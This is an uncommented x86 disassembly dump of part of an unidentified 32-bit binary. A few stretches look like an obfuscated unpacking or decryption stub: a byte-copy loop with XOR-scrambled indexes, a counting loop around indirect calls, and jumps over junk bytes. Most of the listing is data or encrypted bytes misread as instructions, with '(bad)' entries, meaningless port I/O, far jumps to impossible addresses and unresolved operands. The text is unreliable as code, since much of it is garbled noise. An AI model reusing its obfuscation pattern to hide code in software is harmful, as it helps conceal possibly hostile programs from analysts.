  407a67:	popa   
  407a68:	cmp    BYTE PTR [edi-0x5228a133],bh
  407a6e:	arpl   WORD PTR ds:0xdb0be139,dx
  407a74:	test   BYTE PTR [ecx+0xb5e413],cl
  407a7a:	xor    BYTE PTR [edx+0x4b],dh
  407a7d:	jge    0x407a60
  407a7f:	adc    eax,0xd98dbefa
  407a84:	js     0x407a68
  407a86:	adc    BYTE PTR [ebp-0x30574109],ah
  407a8c:	adc    DWORD PTR ds:0x9c0ea2f3,0xe8733798
  407a96:	mov    BYTE PTR [ecx-0x41],dl
  407a99:	jno    0x407a2b
  407a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a9c:	xchg   DWORD PTR [edx+0x58ae8ac],esi
  407aa2:	xor    eax,0x66bd09ee
  407aa7:	(bad)  
  407aa8:	fcomp  DWORD PTR [ecx-0xb46a55a]
  407aae:	pop    ebx
  407aaf:	clc    
  407ab0:	(bad)  
  407ab2:	xchg   ecx,eax
  407ab3:	cld    
  407ab4:	jge    0x407a64
  407ab6:	les    esp,FWORD PTR [ebx+0x2da24714]
  407abc:	sbb    BYTE PTR [ebx],ch
  407abe:	mov    cl,0x4
  407ac0:	fld    DWORD PTR [esi+0x26]
  407ac3:	cld    
  407ac4:	lods   al,BYTE PTR ds:[esi]
  407ac5:	outs   dx,DWORD PTR ds:[esi]
  407ac6:	in     al,dx
  407ac7:	mov    edx,0x93904a72
  407acc:	sti    
  407acd:	inc    esp
  407ace:	cmp    cl,BYTE PTR [ebx-0x735137df]
  407ad4:	addr16 push 0xffffffc3
  407ad7:	or     DWORD PTR gs:[ecx+ebp*2],ebp
  407adb:	sti    
  407adc:	lea    ecx,[eax]
  407ade:	or     dh,dl
  407ae0:	sbb    edx,ebx
  407ae2:	lods   eax,DWORD PTR ds:[esi]
  407ae3:	jbe    0x407b64
  407ae5:	inc    edx
  407ae6:	add    bl,BYTE PTR [edi]
  407ae8:	lods   eax,DWORD PTR ds:[esi]
  407ae9:	daa    
  407aea:	cmp    al,0xff
  407aec:	sbb    BYTE PTR [ebx*8+0x5b379c1b],0x4c
  407af4:	adc    al,0xe5
  407af6:	push   0x6c
  407af8:	ja     0x407b0c
  407afa:	jmp    0xada01124
  407aff:	(bad)  
  407b00:	or     DWORD PTR [edx+ebp*4+0x46ad447f],esi
  407b07:	inc    edi
  407b08:	pop    es
  407b09:	push   cs
  407b0a:	push   eax
  407b0b:	cld    
  407b0c:	mov    ds:0xb1b8438e,al
  407b11:	nop
  407b12:	mov    eax,ds:0x2aabd065
  407b17:	mov    al,ds:0x4d42729d
  407b1c:	cld    
  407b1d:	xor    ecx,0xffffff9b
  407b20:	sub    ch,BYTE PTR ss:[edi+0x3996841]
  407b27:	ja     0x407b59
  407b29:	fsubr  DWORD PTR [esi]
  407b2b:	xor    eax,0x4e433f3d
  407b30:	mov    cl,0xf1
  407b33:	sbb    ecx,ebx
  407b35:	test   BYTE PTR [esi+0x17],bl
  407b38:	push   ds
  407b39:	jle    0x407b89
  407b3b:	inc    ebp
  407b3c:	push   ebx
  407b3d:	in     al,0x8d
  407b3f:	rcr    ah,0xdb
  407b42:	or     DWORD PTR [eax],0x6047a43b
  407b48:	mov    eax,0x6e059cf9
  407b4d:	sahf   
  407b4e:	in     al,0x86
  407b50:	xchg   edx,eax
  407b51:	lds    edi,FWORD PTR [edx-0x77]
  407b54:	and    BYTE PTR [ecx-0x1c],dl
  407b57:	(bad)  
  407b59:	outs   dx,BYTE PTR ds:[esi]
  407b5a:	lods   eax,DWORD PTR ds:[esi]
  407b5b:	add    DWORD PTR [edx+0x49e860f1],ebp
  407b61:	popf   
  407b62:	ja     0x407afb
  407b64:	jno    0x407b93
  407b66:	aaa    
  407b67:	arpl   WORD PTR [edx+edx*8],bx
  407b6a:	sbb    bl,ah
  407b6c:	push   edx
  407b6d:	test   BYTE PTR [ecx],dl
  407b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b70:	jmp    0x407b9b
  407b72:	fwait
  407b73:	out    0x22,al
  407b75:	ds dec ebp
  407b77:	ret    
  407b78:	rcl    cl,0x70
  407b7b:	xor    edi,DWORD PTR [ebx+0x1f6e7505]
  407b81:	mov    DWORD PTR [edx+0x7397e234],ebx
  407b87:	test   eax,0x2b2e6c43
  407b8c:	mov    edx,0x16c4e5d5
  407b91:	push   ds
  407b92:	dec    esi
  407b93:	lahf   
  407b94:	mov    ss,WORD PTR [ecx+0x19397367]
  407b9a:	adc    esp,DWORD PTR [ebx+0x68]
  407b9d:	fmul   QWORD PTR [edi-0x1f]
  407ba0:	add    edi,DWORD PTR [ebp+0x10]
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0xc855:0x2cfdba79
  407cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ccf:	jmp    0xdcbefae7
  407cd4:	jg     0x407d54
  407cd6:	jle    0x407c93
  407cd8:	and    cl,bl
  407cda:	clc    
  407cdb:	push   ecx
  407cdc:	mov    al,0xc
  407cde:	pop    eax
  407cdf:	adc    al,0x8f
  407ce1:	fwait
  407ce2:	mov    ebp,0x2bda352a
  407ce7:	nop
  407ce8:	push   es
  407ce9:	ret    
  407cea:	push   ds
  407ceb:	lock and al,0xa5
  407cee:	sbb    al,0x8b
  407cf0:	in     eax,0x4a
  407cf2:	mov    ds:0xffef97c9,eax
  407cf7:	jb     0x407d2c
  407cf9:	icebp  
  407cfa:	inc    esi
  407cfb:	jo     0x407d07
  407cfd:	repnz sub edi,DWORD PTR [eax]
  407d00:	xor    bl,ah
  407d02:	fcomp  st(4)
  407d04:	fadd   QWORD PTR [esi-0xe]
  407d07:	cmp    edx,DWORD PTR [ebp-0x6aec5ce2]
  407d0d:	iret   
  407d0e:	mov    esi,0xc33c092
  407d13:	sub    esi,DWORD PTR [ebp+0x42]
  407d16:	test   al,0x2
  407d18:	dec    ebp
  407d19:	(bad)  
  407d1a:	jecxz  0x407cc0
  407d1c:	sbb    eax,0x3c7e796a
  407d21:	pop    ss
  407d22:	call   0x964f0624
  407d27:	dec    ebx
  407d28:	dec    esi
  407d29:	pop    es
  407d2a:	pop    esp
  407d2b:	or     eax,0xa469fbd6
  407d30:	sahf   
  407d31:	and    al,0xb0
  407d33:	icebp  
  407d34:	and    ebp,DWORD PTR [ebp-0x6d]
  407d37:	outs   dx,DWORD PTR ds:[esi]
  407d38:	and    DWORD PTR [ebp-0x49],ebx
  407d3b:	imul   eax,eax,0xffffffb3
  407d3e:	fwait
  407d3f:	add    esp,ebx
  407d41:	jg     0x407ceb
  407d43:	xchg   ecx,eax
  407d44:	imul   ecx,DWORD PTR [edx],0x1f
  407d47:	sbb    bh,dl
  407d49:	pop    ebp
  407d4a:	icebp  
  407d4b:	pop    ebp
  407d4c:	lea    ebp,[ebp-0x75]
  407d4f:	xor    DWORD PTR [eax-0x4cbeb14f],0x25329925
  407d59:	jl     0x407cef
  407d5b:	into   
  407d5c:	call   0x6ae0:0x9da7c9fa
  407d63:	sahf   
  407d64:	mov    BYTE PTR [edx-0x309962e2],bl
  407d6a:	es pop esi
  407d6c:	mov    esp,0xcfe45761
  407d71:	pop    ecx
  407d72:	cmc    
  407d73:	rcl    DWORD PTR [edi-0x26],1
  407d76:	mov    ?,eax
  407d78:	mov    ebp,0xd31115f4
  407d7d:	jg     0x407d18
  407d7f:	test   al,0x37
  407d81:	adc    BYTE PTR [eax],bh
  407d83:	mov    dh,0x3a
  407d85:	aad    0x8f
  407d87:	xchg   BYTE PTR [esi-0x3f9e6eeb],bh
  407d8d:	ror    BYTE PTR [edx+0x301f40ca],0xae
  407d94:	dec    edi
  407d95:	mov    eax,0x508a778c
  407d9a:	mov    dl,0x38
  407d9c:	mov    dh,0xc
  407d9e:	push   esp
  407d9f:	repnz fucompp 
  407da2:	inc    eax
  407da3:	loopne 0x407d9c
  407da5:	outs   dx,BYTE PTR ds:[esi]
  407da6:	jo     0x407d68
  407da8:	mov    al,ds:0x26b8363a
  407dad:	dec    BYTE PTR [edi+0x7852dc3c]
  407db3:	cmp    eax,0x83bc4f88
  407db8:	cs jmp 0x407e2e
  407dbb:	add    DWORD PTR [ecx+0x8],ebx
  407dbe:	adc    eax,DWORD PTR [edx-0x6e]
  407dc1:	mov    ds:0xfc7654eb,eax
  407dc6:	outs   dx,DWORD PTR ds:[esi]
  407dc7:	aas    
  407dc8:	ds inc ebx
  407dca:	add    eax,0xa693ebdf
  407dcf:	xchg   esi,eax
  407dd0:	pop    esp
  407dd1:	(bad)  
  407dd3:	test   edi,0x24724466
  407dd9:	mov    al,0x66
  407ddb:	arpl   WORD PTR [eax],sp
  407ddd:	dec    edx
  407dde:	nop
  407ddf:	leave  
  407de0:	jl     0x407d93
  407de2:	push   esp
  407de3:	loop   0x407e34
  407de5:	cdq    
  407de6:	aas    
  407de7:	cdq    
  407de8:	pop    ebp
  407de9:	sbb    DWORD PTR [esi-0x64],edx
  407dec:	add    ecx,ebp
  407dee:	daa    
  407def:	inc    eax
  407df0:	inc    eax
  407df1:	in     eax,0xf2
  407df3:	add    BYTE PTR [ecx],0x6a
  407df6:	adc    DWORD PTR [ebx+0x29],edi
  407df9:	nop
  407dfa:	jmp    0x407da6
  407dfc:	dec    ebx
  407dfd:	arpl   WORD PTR [eax-0x54],di
  407e00:	mov    al,BYTE PTR [ebx]
  407e02:	(bad)  
  407e03:	pop    eax
  407e04:	mov    al,0x2d
  407e06:	in     al,0x28
  407e08:	add    eax,0xab93e9b9
  407e0d:	add    al,BYTE PTR [edx+0x2583f34f]
  407e13:	(bad)  
  407e14:	in     al,0xec
  407e16:	mov    esp,0x38c94bad
  407e1b:	xor    al,0x80
  407e1d:	(bad)  
  407e1e:	fld    TBYTE PTR [esi+0x57]
  407e21:	ss pop edx
  407e23:	and    BYTE PTR [eax+0x486fc8ad],dl
  407e29:	mov    al,ds:0x2bbada94
  407e2e:	xchg   ebx,eax
  407e2f:	mov    WORD PTR [eax+0x20a84105],ds
  407e35:	repz out 0xe6,eax
  407e38:	fwait
  407e39:	cmp    eax,esi
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [ebp+0x47],edi
  407e85:	and    al,0x40
  407e87:	dec    edi
  407e88:	adc    BYTE PTR [esi+0x7e],bh
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407e15
  407e90:	js     0x407e6a
  407e92:	or     eax,0xfa9df444
  407e97:	xchg   ebp,eax
  407e98:	jecxz  0x407f09
  407e9a:	mov    eax,0xdecc5381
  407e9f:	data16 xlat BYTE PTR gs:[ebx]
  407ea2:	pop    edi
  407ea3:	jb     0x407e7d
  407ea5:	outs   dx,BYTE PTR ds:[esi]
  407ea6:	mov    ebx,0x31957362
  407eab:	adc    esi,ebp
  407ead:	ror    DWORD PTR [edx+0x79f28f03],cl
  407eb3:	xor    DWORD PTR [ecx],ecx
  407eb5:	aad    0x27
  407eb7:	pop    ebx
  407eb8:	aad    0x82
  407eba:	adc    eax,0x705fb68d
  407ebf:	jmp    0xefc1:0xe656dc29
  407ec6:	in     al,dx
  407ec7:	jmp    0x4de367d
  407ecc:	test   eax,0xce3668d0
  407ed1:	and    al,0x21
  407ed3:	mov    eax,ds:0x54fd62f4
  407ed8:	add    BYTE PTR es:[ebx-0x6a],bh
  407edc:	ds es fadd st,st(0)
  407ee0:	fidivr DWORD PTR [esi-0x4a2a3264]
  407ee6:	dec    edi
  407ee7:	lds    ebx,FWORD PTR [edi]
  407ee9:	jmp    0x407ee8
  407eeb:	cdq    
  407eec:	or     DWORD PTR [ecx+ebx*2+0x30],0x3e69d036
  407ef4:	add    al,0x7b
  407ef6:	jmp    0x9c6:0x54f941ff
  407efd:	pop    es
  407efe:	sbb    cl,BYTE PTR [ebp+edi*1+0x5f]
  407f02:	or     DWORD PTR [ebp+0x30],esi
  407f05:	daa    
  407f06:	ja     0x407ea4
  407f08:	(bad)  
  407f0a:	push   edx
  407f0b:	jmp    0x7d786a82
  407f10:	mov    gs,WORD PTR [ecx+0x7a]
  407f13:	cmp    ecx,DWORD PTR [edx+ecx*1+0x4f2a2581]
  407f1a:	mov    ebp,0x545b5242
  407f1f:	int3   
  407f20:	xchg   ebx,eax
  407f21:	cld    
  407f22:	arpl   WORD PTR [ebp-0x4343f91c],cx
  407f28:	call   0x15976d6
  407f2d:	sbb    eax,0x2bab9f46
  407f32:	dec    ebp
  407f33:	inc    eax
  407f34:	push   edi
  407f35:	retf   0x22c8
  407f38:	into   
  407f39:	ror    DWORD PTR [ebx+0x6],cl
  407f3c:	(bad)  
  407f3d:	dec    DWORD PTR [ecx+eax*2-0x4a]
  407f41:	outs   dx,DWORD PTR ds:[esi]
  407f42:	dec    DWORD PTR [ebx+0x78a1b833]
  407f48:	lds    ecx,FWORD PTR [edx-0x38fc74fe]
  407f4e:	outs   dx,BYTE PTR ds:[esi]
  407f4f:	jae    0x407f10
  407f51:	and    eax,0x53d97376
  407f56:	sub    DWORD PTR [ecx-0x60c6212],eax
  407f5c:	retf   
  407f5d:	mov    eax,0x5ace3880
  407f62:	sub    al,0x16
  407f64:	and    BYTE PTR [ebp+0x6f],dh
  407f67:	pop    ds
  407f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f69:	in     eax,dx
  407f6a:	cmp    esi,DWORD PTR [eax-0xdb1d06c]
  407f70:	push   es
  407f71:	mov    bl,BYTE PTR [eax-0x3e]
  407f74:	sub    eax,0x3a6e76a1
  407f79:	xchg   edx,eax
  407f7a:	jo     0x407f63
  407f7c:	push   esi
  407f7d:	int    0x4e
  407f7f:	mov    ds:0xbf5a5c9e,al
  407f84:	in     eax,0x3d
  407f86:	add    DWORD PTR [edx-0x7467b1e5],ebx
  407f8c:	xchg   edx,eax
  407f8d:	dec    esp
  407f8e:	pop    edi
  407f8f:	xchg   esp,eax
  407f90:	cld    
  407f91:	cld    
  407f92:	or     ah,al
  407f94:	push   cs
  407f95:	nop
  407f96:	scas   eax,DWORD PTR es:[edi]
  407f97:	mov    esi,0x4db2bef2
  407f9c:	xchg   ecx,eax
  407f9d:	fmul   DWORD PTR [esi+0x7460f666]
  407fa3:	mov    edi,0x5fbdbe76
  407fa8:	aaa    
  407fa9:	fwait
  407faa:	call   0xdf298ed8
  407faf:	cwde   
  407fb0:	test   DWORD PTR [ebx],ebx
  407fb2:	pop    es
  407fb3:	push   cs
  407fb4:	xchg   ebx,eax
  407fb5:	push   ebp
  407fb6:	sti    
  407fb7:	in     eax,0x7d
  407fb9:	mov    DWORD PTR [ebp-0x61fce860],0xdb83c136
  407fc3:	shr    ebx,1
  407fc5:	mov    ecx,0x173c982b
  407fca:	pushw  ds
  407fcc:	dec    ebx
  407fcd:	sub    ah,dl
  407fcf:	pop    ss
  407fd0:	xchg   DWORD PTR ds:0x10b22edf,eax
  407fd6:	aam    0xe9
  407fd8:	xlat   BYTE PTR ds:[ebx]
  407fd9:	dec    esi
  407fda:	inc    edx
  407fdb:	shr    DWORD PTR [eax-0x50bb2db8],1
  407fe1:	into   
  407fe2:	dec    ecx
  407fe3:	adc    eax,0xa49705c7
  407fe8:	push   ecx
  407fe9:	and    al,BYTE PTR [ebp-0x3ec54b2b]
  407fef:	loopne 0x40806d
  407ff1:	xor    eax,ecx
  407ff3:	add    eax,edx
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	mov    esi,0x2d621cd9
  408013:	push   ss
  408014:	jle    0x408094
  408016:	fdivr  QWORD PTR [edi+0x7e]
  408019:	jle    0x407ff0
  40801b:	daa    
  40801c:	xor    DWORD PTR [esi+edx*8],ecx
  40801f:	push   ds
  408020:	and    cl,BYTE PTR [edx]
  408022:	hlt    
  408023:	loop   0x40809c
  408025:	adc    esi,esp
  408027:	or     eax,0x70059873
  40802c:	int3   
  40802d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40802e:	push   0x64
  408030:	fs fcmovu st,st(7)
  408033:	push   es
  408034:	lea    esi,[esi-0x5a]
  408037:	jbe    0x408009
  408039:	sar    DWORD PTR [edx-0xaa2e1ca],0xe0
  408040:	fcomp  QWORD PTR [ecx-0x8]
  408043:	mov    bh,BYTE PTR [eax-0xb749194]
  408049:	cmp    al,0xd0
  40804b:	cmp    eax,0x2edbfd5b
  408050:	scas   al,BYTE PTR es:[edi]
  408051:	in     eax,0x1c
  408053:	mov    BYTE PTR [ebp+0x2f],ch
  408056:	addr16 jae 0x40800c
  408059:	push   ecx
  40805a:	pop    ss
  40805b:	sbb    BYTE PTR [eax+0x3e],ah
  40805e:	test   ebp,edx
  408060:	mov    cl,0x36
  408062:	xchg   edx,eax
  408063:	xchg   ecx,eax
  408064:	xlat   BYTE PTR ds:[ebx]
  408065:	ret    0x7bbf
  408068:	adc    edx,edi
  40806a:	add    DWORD PTR [ebx-0x30],ecx
  40806d:	inc    esi
  40806e:	ret    
  40806f:	out    0x4d,eax
  408071:	jnp    0x407fff
  408073:	aam    0xe5
  408075:	inc    ebp
  408076:	pusha  
  408077:	vpaddsw xmm3,xmm7,XMMWORD PTR [edx+0x75]
  40807c:	inc    edx
  40807d:	xchg   esi,eax
  40807e:	or     ah,dh
  408080:	jmp    0x408022
  408082:	sbb    DWORD PTR [eax-0x30],ebp
  408085:	pushw  es
  408087:	shl    bl,0xd1
  40808a:	mov    dh,0x1d
  40808c:	push   DWORD PTR [ebx+0x4a]
  40808f:	call   0x98a1aeae
  408094:	(bad)
  408097:	mov    fs,WORD PTR [eax+0x374359cf]
  40809d:	scas   al,BYTE PTR es:[edi]
  40809e:	es mov ebx,0x21270942
  4080a4:	loope  0x4080fa
  4080a6:	scas   eax,DWORD PTR es:[edi]
  4080a7:	inc    edi
  4080a8:	or     esp,DWORD PTR [esi+esi*8+0x577ea5f2]
  4080af:	mov    eax,ds:0x84d780c9
  4080b4:	sub    ebp,eax
  4080b6:	dec    ecx
  4080b7:	push   es
  4080b8:	mov    BYTE PTR gs:[edi],0x47
  4080bc:	scas   eax,DWORD PTR es:[edi]
  4080bd:	mov    ebx,0xf0620af6
  4080c2:	pop    edi
  4080c3:	fwait
  4080c4:	xor    ch,BYTE PTR [esi+0x7683652e]
  4080ca:	cmc    
  4080cb:	bound  esi,QWORD PTR [ecx-0x767436d5]
  4080d1:	xlat   BYTE PTR ds:[ebx]
  4080d2:	enter  0x663e,0x8e
  4080d6:	mov    eax,ds:0xf2ca5805
  4080db:	cwde   
  4080dc:	scas   eax,DWORD PTR es:[edi]
  4080dd:	adc    DWORD PTR ds:0x7f4f4a23,edi
  4080e3:	sub    DWORD PTR ds:0xe228e275,eax
  4080e9:	rcl    esi,0x4
  4080ec:	jle    0x408123
  4080ee:	out    dx,eax
  4080ef:	xchg   ecx,eax
  4080f0:	add    BYTE PTR [edi],cl
  4080f2:	mov    edx,0xecde9113
  4080f7:	(bad)  
  4080f8:	xor    edi,DWORD PTR [ebp-0x7a]
  4080fb:	cs mov edx,0xb6b5e726
  408101:	push   esp
  408102:	adc    bh,BYTE PTR [esi+0x2b6eb5e4]
  408108:	mov    ebx,0x231a2558
  40810d:	and    al,BYTE PTR [ebx-0x39]
  408110:	push   es
  408111:	ins    DWORD PTR es:[edi],dx
  408112:	ret    
  408113:	mov    eax,es
  408115:	cmp    bl,dl
  408117:	adc    BYTE PTR gs:[ebx-0x3a],dh
  40811b:	jae    0x4080eb
  40811d:	js     0x4080fe
  40811f:	mov    cl,0x38
  408121:	fld    QWORD PTR [edi-0x14]
  408124:	leave  
  408125:	mov    bl,0x8
  408127:	inc    edx
  408128:	aam    0x2a
  40812a:	sub    DWORD PTR [ecx-0x178ad01a],edi
  408130:	xchg   BYTE PTR [ecx],al
  408132:	push   edi
  408133:	imul   ecx
  408135:	sahf   
  408136:	call   0xf2e4d191
  40813b:	xchg   ebp,eax
  40813c:	and    eax,0x11f0d24f
  408141:	arpl   WORD PTR [edx-0xfaaf3c5],ax
  408147:	xor    DWORD PTR [eax-0x12],0x26140871
  40814e:	fisttp DWORD PTR [esi+0x44]
  408151:	shr    ebp,0x30
  408154:	xchg   edi,eax
  408155:	outs   dx,DWORD PTR ds:[esi]
  408156:	pop    ebx
  408157:	dec    ecx
  408158:	inc    edx
  408159:	add    eax,0xf66f26ca
  40815e:	std    
  40815f:	call   0xdba6:0xb7789f7a
  408166:	(bad)  
  408168:	outs   dx,DWORD PTR ds:[esi]
  408169:	iret   
  40816a:	in     al,0x9b
  40816c:	or     eax,ebx
  40816e:	pop    ebx
  40816f:	and    cl,0x9e
  408172:	mov    ds:0x59d72efa,eax
  408177:	aam    0x30
  408179:	add    BYTE PTR [ebp+0x7a],ah
  40817c:	xor    eax,ecx
  40817e:	add    eax,edx
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es cmp eax,0x8367de4c
  4081a5:	pop    ss
  4081a6:	jle    0x408226
  4081a8:	fdivr  QWORD PTR [edi+0x7e]
  4081ab:	jle    0x408186
  4081ad:	adc    al,0x40
  4081af:	mov    esi,0x5aea776f
  4081b4:	loopne 0x4081b4
  4081b6:	pusha  
  4081b7:	push   edx
  4081b8:	pop    ecx
  4081b9:	cmp    bl,ch
  4081bb:	xchg   esp,eax
  4081bc:	loop   0x4081bc
  4081be:	dec    ebx
  4081bf:	inc    edx
  4081c0:	mov    dl,0xb4
  4081c2:	aaa    
  4081c3:	mov    gs,ebp
  4081c5:	popa   
  4081c6:	stos   BYTE PTR es:[edi],al
  4081c7:	ror    BYTE PTR [edi-0x1ad115a5],0x78
  4081ce:	outs   dx,DWORD PTR ds:[esi]
  4081cf:	push   ds
  4081d0:	mov    bh,0x9f
  4081d2:	push   es
  4081d3:	out    0xae,al
  4081d5:	sub    eax,0x256856f8
  4081da:	inc    eax
  4081db:	out    dx,al
  4081dc:	leave  
  4081dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081de:	inc    eax
  4081df:	and    DWORD PTR [edi-0x16f20600],ebx
  4081e5:	ja     0x40823c
  4081e7:	ror    BYTE PTR [edx+0x6c],cl
  4081ea:	jmp    0x4081c6
  4081ec:	dec    eax
  4081ed:	pop    edx
  4081ee:	xlat   BYTE PTR ds:[ebx]
  4081ef:	adc    eax,0x616c5f3b
  4081f4:	xchg   ebx,eax
  4081f5:	xor    BYTE PTR [esi-0x16],cl
  4081f8:	les    edi,FWORD PTR [edx+0xa02616e]
  4081fe:	mov    edx,0x4d88a50c
  408203:	xchg   DWORD PTR [edi-0x6fedc515],ebx
  408209:	mov    WORD PTR [esi],?
  40820b:	daa    
  40820c:	outs   dx,DWORD PTR ds:[esi]
  40820d:	imul   eax,DWORD PTR [ebx+0x58],0x3f
  408211:	inc    eax
  408212:	lahf   
  408213:	adc    DWORD PTR [esi+0x182dfa78],0xaab88963
  40821d:	das    
  40821e:	stos   BYTE PTR es:[edi],al
  40821f:	jbe    0x408279
  408221:	mov    ds:0x2fe61b40,al
  408226:	pop    ds
  408227:	mov    ds:0x8d994922,eax
  40822c:	mov    al,0x7a
  40822e:	retf   0x1486
  408231:	jb     0x4081fe
  408233:	fadd   st(5),st
  408235:	jmp    0x8e5fe374
  40823a:	mov    ds:0x64fd6667,al
  40823f:	sbb    esi,eax
  408241:	(bad)  
  408242:	or     eax,0x2584b7a7
  408247:	jl     0x40824e
  408249:	stc    
  40824a:	sbb    BYTE PTR [esi-0x1bbbb6c5],cl
  408250:	push   ecx
  408251:	int    0xa3
  408253:	mov    bl,0xfc
  408255:	leave  
  408256:	test   DWORD PTR [ebp-0xe3b34db],esp
  40825c:	mov    ebp,0xc86b4e02
  408261:	loope  0x4082c6
  408263:	or     al,0xbe
  408265:	or     al,BYTE PTR [ebx+0x6f73e122]
  40826b:	sub    eax,0xfd1fe3e6
  408270:	into   
  408271:	xor    BYTE PTR [ebx-0x2e],0x79
  408275:	test   ch,ch
  408277:	mov    bl,0xe8
  408279:	cmp    DWORD PTR [edx+0x58],esp
  40827c:	sub    DWORD PTR [ebp+0x4c0983d7],ebx
  408282:	pusha  
  408283:	loop   0x408237
  408285:	mov    ah,0xe
  408287:	dec    eax
  408288:	cmc    
  408289:	sbb    ebx,DWORD PTR [ebx+0x63a7f77b]
  40828f:	cs push 0x6c
  408292:	xor    DWORD PTR [ebx-0x5d],ecx
  408295:	jnp    0x4082b7
  408297:	sbb    DWORD PTR [ebx+0x5],0xef987725
  40829e:	clc    
  40829f:	aas    
  4082a0:	push   ds
  4082a1:	retf   0x9b8c
  4082a4:	ds sbb eax,0x772856f9
  4082aa:	pop    es
  4082ab:	mov    edi,0xa388f8f3
  4082b0:	pop    esi
  4082b1:	js     0x4082f4
  4082b3:	cmp    ecx,DWORD PTR [eax+0x5e]
  4082b6:	adc    BYTE PTR [esi+esi*2-0x11],dl
  4082ba:	adc    esi,DWORD PTR [edi+0x56869a14]
  4082c0:	hlt    
  4082c1:	rcr    BYTE PTR [edi+0x7e],1
  4082c4:	(bad)  
  4082c5:	push   eax
  4082c6:	aaa    
  4082c7:	les    esp,FWORD PTR [esp+edi*4]
  4082ca:	in     eax,0x60
  4082cc:	dec    edi
  4082cd:	sub    BYTE PTR [ecx],0x63
  4082d0:	cmp    BYTE PTR [edi+0x3d],bl
  4082d3:	mov    cl,0x2
  4082d5:	jnp    0x408277
  4082d7:	iret   
  4082d8:	pop    es
  4082d9:	(bad)  
  4082da:	cmp    ah,bh
  4082dc:	mov    al,0x3
  4082de:	cmp    ecx,DWORD PTR [edi]
  4082e0:	jp     0x40829c
  4082e2:	add    dl,cl
  4082e4:	xor    bh,BYTE PTR [ecx]
  4082e6:	push   cs
